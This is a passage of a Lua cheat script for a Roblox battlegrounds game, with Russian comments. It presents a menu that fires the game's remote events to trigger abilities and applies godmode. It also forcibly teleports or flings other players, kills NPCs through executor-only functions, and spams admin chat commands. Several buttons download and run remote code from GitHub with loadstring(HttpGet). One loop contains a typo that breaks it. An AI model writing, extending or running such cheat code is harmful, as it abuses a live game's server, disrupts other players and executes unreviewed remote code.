        Name = "Bankai: Zanka no Tachi",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Bankai.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "World Breaker",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("World Breaker").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "North Tenchi Kaijin",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("North Tenchi Kaijin").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "West Zanjitsu Gokui",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("West Zanjitsu Gokui").LocalScript.Event:FireServer()
        end
    }
)

local Section = Tab:AddSection({
 Name = "Yhwach"
})

Tab:AddButton(
    {
        Name = "Blut Vene Aufheben",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack["Blut Vene Aufheben"].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Sklaverei",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Sklaverei.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Sankt Zwinger",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack["Sankt  Zwinger"].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Auswahlen",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack[utf8.char(65, 117, 115, 119, 228, 104, 108, 101, 110)].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "The Almighty",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack["The Almighty"].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Yamamoto Slash",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack["Yamamoto Slash"].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Splash Almighty",
        Callback = function()        
            game:GetService("Players").LocalPlayer.Backpack["Splash Almighty"].LocalScript.Event:FireServer()
        end
    }
)



local Section = Tab:AddSection({
 Name = "Aizen V2 (TYBW)"
})

Tab:AddButton(
    {
        Name = "Reiatsu",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Reiatsu.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Spiritual Pressure",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack["Spiritual Pressure"].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Hado 90",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack[utf8.char(72, 97, 100, 333, 32, 57, 48)].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Awakening / Hogyoku Fusion",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Unstealed").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Diamond Field",
        Callback = function()
            game:GetService("ReplicatedStorage").Aizen.RemoteEvent:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Hado 90: Kurohitsgi",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack[utf8.char(72, 97, 100, 333, 32, 57, 48, 58, 32, 75, 117, 114, 111, 104, 105, 116, 115, 117, 103, 105)].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Hado 99: Goryutenmetsu",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack[utf8.char(72, 97, 100, 333, 32, 57, 57, 58, 32, 71, 111, 114, 121, 117, 116, 101, 110, 109, 101, 116, 115, 117)].LocalScript.Event:FireServer()
        end
    }
)

local Section = Tab:AddSection({
 Name = "Vergil V2 (I am that storm that is approaching..)"
})

Tab:AddButton(
    {
        Name = "Kageoni",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character.Kageoni.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Slash Barrage",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Slash Barrage").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Upper Slash",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Upper Slash").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Aerial Slash",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Aerial Slash").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Judgment Cut",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Judgement Cut").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Rapid Slash",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Rapid Slash").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Void Slash",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Void Slash").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Garganta Slash (opens portal to Hueco Mundo)",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Garganta Slash").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "My power should be absolute... JUDGMENT CUT END",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character:FindFirstChild("Judgement Cut End").LocalScript.Event:FireServer()
        end
    }
)



local Tab = Window:MakeTab({
	Name = "Yhwach",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
 Name = "Yhwach"
})

local abilities = {
    {Name = "Blut Vene Aufheben", ScriptPath = '["Blut Vene Aufheben"]'},
    {Name = "Sklaverei", ScriptPath = ".Sklaverei"},
    {Name = "Sankt Zwinger", ScriptPath = '["Sankt  Zwinger"]'},
    {Name = "Auswahlen", ScriptPath = "[utf8.char(65, 117, 115, 119, 228, 104, 108, 101, 110)]"},
    {Name = "The Almighty", ScriptPath = '["The Almighty"]'},
    {Name = "Yamamoto Slash", ScriptPath = '["Yamamoto Slash"]'},
    {Name = "Splash Almighty", ScriptPath = '["Splash Almighty"]'}
}

-- Добавляем выпадающий список для выбора способности
Tab:AddDropdown({
    Name = "Выберите способность",
    Options = (function()
        local options = {}
        for _, ability in ipairs(abilities) do
            table.insert(options, ability.Name)
        end
        return options
    end)(),
    Callback = function(selectedAbilityName)
        local selectedAbility = nil
        for _, ability in ipairs(abilities) do
            if ability.Name == selectedAbilityName then
                selectedAbility = ability
                break
            end
        end

        if selectedAbility then
            -- Выпадающий список для выбора действия
            Tab:AddDropdown({
                Name = "Выберите действие",
                Options = {"Использовать", "Выдать инструмент"},
                Callback = function(action)
                    if action == "Использовать" then
                        -- Использование способности
                        local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. ".LocalScript.Event:FireServer()"
                        loadstring(scriptPath)()
                    elseif action == "Выдать инструмент" then
                        -- Создание и выдача инструмента
                        local tool = Instance.new("Tool")
                        tool.Name = selectedAbility.Name
                        tool.RequiresHandle = false
                        tool.Activated:Connect(function()
                            local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. ".LocalScript.Event:FireServer()"
                            loadstring(scriptPath)()
                        end)
                        tool.Parent = game:GetService("Players").LocalPlayer.Backpack
                    end
                end
            })
        end
    end
})

local Tab = Window:MakeTab({
	Name = "Aizen TYBW (v2)",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
 Name = "Aizen V2 (TYBW)"
})

local abilities = {
    {Name = "Reiatsu", ScriptPath = ".Reiatsu"},
    {Name = "Spiritual Pressure", ScriptPath = '["Spiritual Pressure"]'},
    {Name = "Hado 90", ScriptPath = "[utf8.char(72, 97, 100, 333, 32, 57, 48)]"},
    {Name = "Awakening / Hogyoku Fusion", ScriptPath = ':FindFirstChild("Unstealed")'},
    {Name = "Diamond Field", IsReplicatedStorage = true, RemotePath = "Aizen.RemoteEvent"},
    {Name = "Hado 90: Kurohitsgi", ScriptPath = "[utf8.char(72, 97, 100, 333, 32, 57, 48, 58, 32, 75, 117, 114, 111, 104, 105, 116, 115, 117, 103, 105)]"},
    {Name = "Hado 99: Goryutenmetsu", ScriptPath = "[utf8.char(72, 97, 100, 333, 32, 57, 57, 58, 32, 71, 111, 114, 121, 117, 116, 101, 110, 109, 101, 116, 115, 117)]"}
}

-- Добавляем выпадающий список для выбора способности
Tab:AddDropdown({
    Name = "Выберите способность",
    Options = (function()
        local options = {}
        for _, ability in ipairs(abilities) do
            table.insert(options, ability.Name)
        end
        return options
    end)(),
    Callback = function(selectedAbilityName)
        local selectedAbility = nil
        for _, ability in ipairs(abilities) do
            if ability.Name == selectedAbilityName then
                selectedAbility = ability
                break
            end
        end

        if selectedAbility then
            -- Выпадающий список для выбора действия
            Tab:AddDropdown({
                Name = "Выберите действие",
                Options = {"Использовать", "Выдать инструмент"},
                Callback = function(action)
                    if action == "Использовать" then
                        if selectedAbility.IsReplicatedStorage then
                            -- Выполнение через ReplicatedStorage
                            game:GetService("ReplicatedStorage")[selectedAbility.RemotePath]:FireServer()
                        else
                            -- Выполнение через Backpack
                            local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. ".LocalScript.Event:FireServer()"
                            loadstring(scriptPath)()
                        end
                    elseif action == "Выдать инструмент" then
                        -- Создание и выдача инструмента
                        local tool = Instance.new("Tool")
                        tool.Name = selectedAbility.Name
                        tool.RequiresHandle = false
                        tool.Activated:Connect(function()
                            if selectedAbility.IsReplicatedStorage then
                                -- Выполнение через ReplicatedStorage
                                game:GetService("ReplicatedStorage")[selectedAbility.RemotePath]:FireServer()
                            else
                                -- Выполнение через Backpack
                                local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. ".LocalScript.Event:FireServer()"
                                loadstring(scriptPath)()
                            end
                        end)
                        tool.Parent = game:GetService("Players").LocalPlayer.Backpack
                    end
                end
            })
        end
    end
})

local Tab = Window:MakeTab({
	Name = "Yamamoto Genryusai",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
 Name = "Yamamoto Genryusai"
})

local abilities = {
    {Name = "Reiatsu", ScriptPath = ".Reiatsu"},
    {Name = "Ryujin Jakka", ScriptPath = ':FindFirstChild("Ry\\197\\171jin Jakka")'},
    {Name = "Hado 96: Ittokaso", ScriptPath = ':FindFirstChild("Had\\197\\141 96: Ittokaso")'},
    {Name = "Bankai: Zanka no Tachi", ScriptPath = ".Bankai"},
    {Name = "World Breaker", ScriptPath = ':FindFirstChild("World Breaker")'},
    {Name = "North Tenchi Kaijin", ScriptPath = ':FindFirstChild("North Tenchi Kaijin")'},
    {Name = "West Zanjitsu Gokui", ScriptPath = ':FindFirstChild("West Zanjitsu Gokui")'}
}

-- Добавляем выпадающий список для выбора способности
Tab:AddDropdown({
    Name = "Выберите способность",
    Options = (function()
        local options = {}
        for _, ability in ipairs(abilities) do
            table.insert(options, ability.Name)
        end
        return options
    end)(),
    Callback = function(selectedAbilityName)
        local selectedAbility = nil
        for _, ability in ipairs(abilities) do
            if ability.Name == selectedAbilityName then
                selectedAbility = ability
                break
            end
        end

        if selectedAbility then
            -- Выпадающий список для выбора действия
            Tab:AddDropdown({
                Name = "Выберите действие",
                Options = {"Использовать", "Выдать инструмент"},
                Callback = function(action)
                    if action == "Использовать" then
                        -- Использование способности
                        local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. ".LocalScript.Event:FireServer()"
                        loadstring(scriptPath)()
                    elseif action == "Выдать инструмент" then
                        -- Создание и выдача инструмента
                        local tool = Instance.new("Tool")
                        tool.Name = selectedAbility.Name
                        tool.RequiresHandle = false
                        tool.Activated:Connect(function()
                            local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. ".LocalScript.Event:FireServer()"
                            loadstring(scriptPath)()
                        end)
                        tool.Parent = game:GetService("Players").LocalPlayer.Backpack
                    end
                end
            })
        end
    end
})

local Tab = Window:MakeTab({
	Name = "Coyote Starrk",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
 Name = "Coyote Starrk"
})

local abilities = {
    {Name = "Powerful Flash Barrage", ScriptPath = '["Flash Barrage"]', IsLoop = true},
    {Name = "Powerful Flash Cleave", ScriptPath = '["Flash Cleave"]', IsLoop = true},
    {Name = "Powerful Sonido Clones", ScriptPath = '["Sonido Clones"]', IsLoop = true},
    {Name = "Powerful Chest Cero", ScriptPath = '["Chest Cero"]', IsLoop = true},
    {Name = "Sonido", IsReplicatedStorage = true, RemotePath = "Remotes.sonido"},
    {Name = "Garganta", ScriptPath = ".Garganta"},
    {Name = "Awakening", ScriptPath = "[utf8.char(82,101,115,117,114,114,101,99,99,105,243,110,58,32,32,76,111,115,32,76,111,98,111,115)]"},
    {Name = "Powerful Los Lobos", ScriptPath = '["Los Lobos"]', IsLoop = true},
    {Name = "Powerful Colmilo", ScriptPath = ".Colmilo", IsLoop = true},
    {Name = "Powerful Right Gun", ScriptPath = '["Right Gun"]', IsLoop = true},
    {Name = "Powerful Sonido Cero", ScriptPath = '["Sonido Cero"]', IsLoop = true, EventPath = ".event"},
    {Name = "Powerful Spinning Shots", ScriptPath = '["Spinning Shots"]', IsLoop = true},
    {Name = "Powerful Wolves", ScriptPath = ".Wolves['Divine Dogs']", IsLoop = true, EventType = "RemoteEvent"},
    {Name = "Cero Metralleta", ScriptPath = '["Cero Metralleta"]'}
}

Tab:AddDropdown({
    Name = "Выберите способность",
    Options = (function()
        local options = {}
        for _, ability in ipairs(abilities) do
            table.insert(options, ability.Name)
        end
        return options
    end)(),
    Callback = function(selectedAbilityName)
        local selectedAbility = nil
        for _, ability in ipairs(abilities) do
            if ability.Name == selectedAbilityName then
                selectedAbility = ability
                break
            end
        end

        if selectedAbility then
            Tab:AddDropdown({
                Name = "Выберите действие",
                Options = {"Использовать", "Выдать инструмент"},
                Callback = function(action)
                    if action == "Использовать" then
                        if selectedAbility.IsReplicatedStorage then
                            -- Выполнение через ReplicatedStorage
                            game:GetService("ReplicatedStorage")[selectedAbility.RemotePath]:FireServer()
                        else
                            -- Выполнение через Backpack
                            if selectedAbility.IsLoop then
                                for i = 1, 1 do
                                    local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. (selectedAbility.EventPath or ".LocalScript.Event") .. ":FireServer()"
                                    loadstring(scriptPath)()
                                end
                            else
                                local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. (selectedAbility.EventPath or ".LocalScript.Event") .. ":FireServer()"
                                loadstring(scriptPath)()
                            end
                        end
                    elseif action == "Выдать инструмент" then
                        -- Создание и выдача инструмента
                        local tool = Instance.new("Tool")
                        tool.Name = selectedAbility.Name
                        tool.RequiresHandle = false
                        tool.Activated:Connect(function()
                            if selectedAbility.IsReplicatedStorage then
                                game:GetService("ReplicatedStorage")[selectedAbility.RemotePath]:FireServer()
                            else
                                local scriptPath = "game:GetService('Players').LocalPlayer.Backpack" .. selectedAbility.ScriptPath .. (selectedAbility.EventPath or ".LocalScript.Event") .. ":FireServer()"
                                loadstring(scriptPath)()
                            end
                        end)
                        tool.Parent = game:GetService("Players").LocalPlayer.Backpack
                    end
                end
            })
        end
    end
})


local Tab = Window:MakeTab({
	Name = "Options",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
 Name = "Inject Infinity Yield",
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end    
})

Tab:AddButton(
    {
        Name = "Reset",
        Callback = function()
            game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
        end
    }
)

Tab:AddButton({
 Name = "Anti purple shot",
 Callback = function()
        local player = game:GetService("Players").LocalPlayer
while task.wait() do
local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
for _, part in ipairs(parts) do
part.CanTouch = fasle
end
end
   end    
})

Tab:AddButton({
	Name = "Anti slow",
	Callback = function()
	repeat task.wait()
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()

local initialSpeed = 16
local currentSpeed = Character.Humanoid.WalkSpeed

if currentSpeed >= 0 and currentSpeed <= 10 then
    Character.Humanoid.WalkSpeed = initialSpeed
else
    Character.Humanoid.WalkSpeed = currentSpeed
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
	end    
})

Tab:AddButton({
	Name = "Anti Inventory Lock",
	Callback = function()
      while task.wait() do
  game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
end
	end    
})

Tab:AddDropdown({
    Name = "Input Character",
    Default = "1",
    Options = {
        "Gojo Young", "Yuji Itadori", "Toji Fushiguro", "Denji", "Goku Black", "Muichiro Tokito", "Akaza", "Zenitsu Agatsuma",
        "Kamado Tanjiro", "Kyojuro Rengoku", "Garou", "Giyu Tomioka", "Saitama", "Gyutaro", "Sakuya Izayoi", "Gojo Satoru", "Goku Ultra",
        "Roronoa Zoro", "Yuta Okkotsu", "MK D Luffy", "Cid Kagenou", "Kenjaku", "Vergil", "Megumi Fushiguro", "Green Hero",
        "Asta", "Kinji Hakari", "Ichigo Vasto Lorde", "Ayanokoji Kiyotaka", "Sano Manjiro", "Kurosaki Ichigo", "Mahito", "Sosuke Aizen", "Ryomen Sukuna", "Todo Aoi", "Toge Inumaki", "Kuchiki Byakuya", "Yamamoto Genryusai", "Yhwach"
    },
    Callback = function(Value)
            local args = { Value }
            game:GetService("ReplicatedStorage").Picked:FireServer(unpack(args))
    end
})


Tab:AddToggle({
	Name = "Godmode",
	Default = false,
	Callback = function(Value)
	God = Value
		while God do
		wait(0.2)
		if game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 150 or game:GetService("Players").LocalPlayer.Character.Humanoid.Health < 150 then
	game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("KingofCurses"):FireServer()
end
		end
	end    
})

local playerNametwo = nil
local playerNames = {}
local playerDropdown
local players = game:GetService("Players")

local function updatePlayerNames()
    playerNames = {}
    for _, player in pairs(players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if playerDropdown then
        playerDropdown:Refresh(playerNames, true)
    end
end

playerDropdown =
    Tab:AddDropdown(
    {
        Name = "Bring Player",
        Default = "Select player",
        Options = playerNames,
        Callback = function(PlayerUsername)
            playerNametwo = PlayerUsername
            local gh = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local ohInstance1 = workspace[playerNametwo]["Left Leg"]
game:GetService("ReplicatedStorage").Remote.BoogieWoogie:FireServer(ohInstance1)
  task.wait(0.95)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gh
        end
    }
)

updatePlayerNames()

players.PlayerAdded:Connect(
    function(player)
        updatePlayerNames()
    end
)

players.PlayerRemoving:Connect(
    function(player)
        updatePlayerNames()
    end
)

local playerNametwo = nil
local playerNames = {}
local playerDropdown
local players = game:GetService("Players")

local function updatePlayerNames()
    playerNames = {}
    for _, player in pairs(players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if playerDropdown then
        playerDropdown:Refresh(playerNames, true)
    end
end

playerDropdown =
    Tab:AddDropdown(
    {
        Name = "Void Bring Player",
        Default = "Select player",
        Options = playerNames,
        Callback = function(PlayerUsername)
            playerNametwo = PlayerUsername
            local gh = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
       wait(0.1)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-246, -189, 2850)
      wait(0.1)
local ohInstance1 = workspace[playerNametwo]["Left Leg"]
game:GetService("ReplicatedStorage").Remote.BoogieWoogie:FireServer(ohInstance1)
  task.wait(0.95)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gh
        end
    }
)

updatePlayerNames()

players.PlayerAdded:Connect(
    function(player)
        updatePlayerNames()
    end
)

players.PlayerRemoving:Connect(
    function(player)
        updatePlayerNames()
    end
)

local playerNametwo = nil
local playerNames = {}
local playerDropdown
local players = game:GetService("Players")

local function updatePlayerNames()
    playerNames = {}
    for _, player in pairs(players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if playerDropdown then
        playerDropdown:Refresh(playerNames, true)
    end
end

playerDropdown =
    Tab:AddDropdown(
    {
        Name = "Sky Bring Player",
        Default = "Select player",
        Options = playerNames,
        Callback = function(PlayerUsername)
            playerNametwo = PlayerUsername
            local gh = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
       wait(0.1)
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1e5, 1e11, 1e5)
         wait(0.1)
local ohInstance1 = workspace[playerNametwo]["Left Leg"]
game:GetService("ReplicatedStorage").Remote.BoogieWoogie:FireServer(ohInstance1)
  task.wait(0.95)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gh
        end
    }
)

updatePlayerNames()

players.PlayerAdded:Connect(
    function(player)
        updatePlayerNames()
    end
)

players.PlayerRemoving:Connect(
    function(player)
        updatePlayerNames()
    end
)

local playerNametwo = nil
local playerNames = {}
local playerDropdown
local players = game:GetService("Players")

local function updatePlayerNames()
    playerNames = {}
    for _, player in pairs(players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if playerDropdown then
        playerDropdown:Refresh(playerNames, true)
    end
end

playerDropdown =
    Tab:AddDropdown(
    {
        Name = "Jail Bring Player",
        Default = "Select player",
        Options = playerNames,
        Callback = function(PlayerUsername)
            playerNametwo = PlayerUsername
            local gh = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
       wait(0.1)
       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-831, -40, -60)
         wait(0.25)
local ohInstance1 = workspace[playerNametwo]["Torso"]
game:GetService("ReplicatedStorage").Remote.BoogieWoogie:FireServer(ohInstance1)
  task.wait(0.95)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gh
        end
    }
)

updatePlayerNames()

players.PlayerAdded:Connect(
    function(player)
        updatePlayerNames()
    end
)

players.PlayerRemoving:Connect(
    function(player)
        updatePlayerNames()
    end
)

Tab:AddButton({
 Name = "Anti Void",
 Callback = function()
        local part = Instance.new("Part")
part.Name = "AntiFallPart"
part.Size = Vector3.new(50000, 5, 50000)
part.Transparency = 1
part.Anchored = true
part.Position = Vector3.new(8, -47, -92)
part.Parent = game.Workspace

local part = Instance.new("Part")
part.Name = "AntiFallPart2"
part.Size = Vector3.new(50000, 5, 50000)
part.Transparency = 0.5
part.Anchored = true
part.Position = Vector3.new(8, -94, -92)
part.Parent = game.Workspace
   end    
})

Tab:AddTextbox({
	Name = "Silent Cmds",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat(";" .. Value .."")
	end	  
})

Tab:AddButton({
 Name = "Cure",
 Callback = function()
        game.Players:Chat("/e heal")
   end    
})

Tab:AddButton({
 Name = "Bug mode(Godmode)",
 Callback = function()
        game.Players:Chat("/e bugmode")
   end    
})

Tab:AddButton({
 Name = "Anti jump block",
 Callback = function()
        while true do
  task.wait()
local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)

local initialJump = 50
local currentJump = Character.Humanoid.JumpPower

if currentJump >= 0 and currentJump <= 10 then
    Character.Humanoid.JumpPower = initialJump
else
    Character.Humanoid.JumpPower = currentJump
end
 end
   end    
})

Tab:AddButton({
 Name = "Anti reclining",
 Callback = function()
        local plr = game.Players.LocalPlayer
local char = plr.Character
  for _, child in pairs(char:GetChildren()) do
    if child:IsA("BasePart") then
      child.Massless = false
      child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, math.huge, math.huge) 
    end
  end
   end    
})

Tab:AddButton({
 Name = "Anti reclining v2",
 Callback = function()
        while true do
   task.wait()
speaker = game.Players.LocalPlayer
for i,v in pairs(speaker.Character:GetDescendants()) do
  if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
   v:Destroy()
  end
 end
end
   end    
})

Tab:AddButton({
 Name = "Kill all NPCs",
 Callback = function()
        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 112412400000)
sethiddenproperty(game.Players.LocalPlayer, "MaxSimulationRadius", 112412400000)
for i, d in pairs(game.Workspace:GetDescendants()) do
    if d.ClassName == 'Humanoid' and not game.Players:FindFirstChild(d.Parent.Name) then
        d.Health = 0
    end
end
   end    
})

Tab:AddButton({
 Name = "Anti collision",
 Callback = function()
local Services = setmetatable({}, {__index = function(Self, Index)
    local NewService = game:GetService(Index)
    if NewService then
        Self[Index] = NewService
    end
    return NewService
end})

local LocalPlayer = Services.Players.LocalPlayer

local function PlayerAdded(Player)
    local Character
    local PrimaryPart

    local function CharacterAdded(newCharacter)
        Character = newCharacter
        repeat
            wait()
            PrimaryPart = newCharacter:FindFirstChild("HumanoidRootPart")
        until PrimaryPart
    end

    Player.CharacterAdded:Connect(CharacterAdded)
    if Player.Character then
        CharacterAdded(Player.Character)
    end

    Services.RunService.Heartbeat:Connect(function()
        if Character and Character:IsDescendantOf(workspace) and PrimaryPart and PrimaryPart:IsDescendantOf(Character) then
            if PrimaryPart.AssemblyAngularVelocity.Magnitude > 0 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 0 then
                for _, v in ipairs(Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false
                        v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                        v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                    end
                end
                PrimaryPart.CanCollide = false
                PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
            end
        end
    end)
end

local function OnPlayerAdded(player)
    if player ~= LocalPlayer then
        PlayerAdded(player)
    end
end

for _, player in ipairs(Services.Players:GetPlayers()) do
    OnPlayerAdded(player)
end

Services.Players.PlayerAdded:Connect(OnPlayerAdded)
   end    
})

Tab:AddButton({
    Name = "Touch fling",
    Callback = function()
local function startFling()
            local hrp, c, vel, movel = nil, nil, nil, 0.1
            local player = game.Players.LocalPlayer

            while player and player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 and hiddenfling do
                game:GetService("RunService").Heartbeat:Wait()

                local lp = player
                while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
                    game:GetService("RunService").Heartbeat:Wait()
                    c = lp.Character
                    hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
                end

                if hiddenfling then
                    vel = hrp.Velocity
                    hrp.Velocity = vel * 10000 + Vector3.new(0, 100000, 0)
                    game:GetService("RunService").RenderStepped:Wait()

                    if c and c.Parent and hrp and hrp.Parent then
                        hrp.Velocity = vel
                    end

                    game:GetService("RunService").Stepped:Wait()

                    if c and c.Parent and hrp and hrp.Parent then
                        hrp.Velocity = vel + Vector3.new(0, movel, 0)
                        movel = movel * -1
                    end
                end
            end
        end

        if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
            hiddenfling = true
        else
            hiddenfling = true
            local detection = Instance.new("Decal")
            detection.Name = "juisdfj0i32i0eidsuf0iok"
            detection.Parent = game:GetService("ReplicatedStorage")
        end

        startFling()
end
})

Tab:AddDropdown({
	Name = "Kill Hammers",
	Default = "1",
	Options = {"Kill Hammer v1(Kenjaku)", "Kill Hammer v2(Kenjaku)", "Kill Hammer v3(Kenjaku)"},
	Callback = function(Value)
		if Value == "Kill Hammer v1(Kenjaku)" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_KillHamer1/main/Script"))()
		elseif Value == "Kill Hammer v2(Kenjaku)" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_KillHamer2/main/Script"))()
		elseif Value == "Kill Hammer v3(Kenjaku)" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/AnM-Battlegrounds_KillHamer3/main/Script"))()
		end
	end    
})


Tab:AddButton({
 Name = "Equip all tools",
 Callback = function()
        for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
     if tool:IsA("Tool") then
          tool.Parent = game:GetService("Players").LocalPlayer.Character
     end
 end
   end    
})

Tab:AddButton({
 Name = "Delete all tools",
 Callback = function()
        local Player = game:GetService("Players").LocalPlayer
local Backpack = Player.Backpack
local Character = Player.Character

for _,v in pairs(Backpack:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end
end

for _,v in pairs(Character:GetChildren()) do
   if v:IsA("Tool") or v:IsA("HopperBin") then
       v:Destroy()
   end 
end
   end    
})

Tab:AddToggle({
 Name = "Never turn off SelectionGui",
 Default = false,
 Callback = function(Value)
        local player = game.Players.LocalPlayer
local playerGui = player.PlayerGui
jkiol = Value
while jkiol do
  task.wait()
